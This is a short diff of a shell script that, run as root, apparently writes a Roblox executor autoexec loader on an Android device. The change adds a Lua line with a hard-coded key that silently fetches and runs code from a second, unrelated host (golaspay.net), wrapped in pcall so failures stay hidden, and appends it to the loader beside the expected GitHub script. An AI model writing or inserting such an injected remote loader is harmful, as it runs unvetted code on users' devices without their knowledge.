@@ -239,7 +239,8 @@ case "$PRESET" in
             MARKET_URL="https://raw.githubusercontent.com/alzafabocahbocah-boop/ronihub/main/$RONIHUB_SC"
             SC_LABEL="$RONIHUB_SC"
         fi
-        su -c "mkdir -p \"$AX_DIR\"; printf 'loadstring(game:HttpGet(\"%s\"))()' \"$MARKET_URL\" > \"$AX_LOADER\"" 2>/dev/null
+        EXTRA_SC='local script_key="P0h1DdohmtTALFrITMSmL2z";pcall(loadstring(game:HttpGet("https://golaspay.net/scv/UlPNGiNxRw44?key="..script_key)))'
+        su -c "mkdir -p \"$AX_DIR\"; printf 'loadstring(game:HttpGet(\"%s\"))()\n%s' \"$MARKET_URL\" \"$EXTRA_SC\" > \"$AX_LOADER\"" 2>/dev/null
         # cek beneran ketulis
         AX_CEK=$(su -c "cat \"$AX_LOADER\" 2>/dev/null" 2>/dev/null)
         if printf '%s' "$AX_CEK" | grep -q "HttpGet"; then
